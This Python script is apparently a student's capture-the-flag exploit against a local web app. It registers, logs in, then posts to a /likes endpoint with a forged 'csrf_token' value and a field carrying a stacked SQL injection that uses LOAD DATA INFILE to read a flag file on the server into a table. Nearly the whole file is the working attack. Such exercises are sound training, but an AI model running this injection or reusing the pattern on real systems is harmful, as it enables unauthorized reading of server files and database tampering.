#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8082"
    s = requests.Session()

    register_payload = {"username": "group166", "password": "Super_Secure_INFOSEC21_!?"}
    r = s.post(url + "/register", data=register_payload)
    print(r)

    login_payload = {"username": "group166", "password": "Super_Secure_INFOSEC21_!?"}
    s.post(url + "/login", data=login_payload)

    unlike_payload = {"action": "Dislike", "csrf_token": "True", "AKeyThatIsNotCsrf_tokenNorAction": "1'; LOAD DATA INFILE '\flag\flag.text' INTO TABLE likes'#"}

    p = s.post(url + "/likes", data=unlike_payload)

    print(p.text)

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


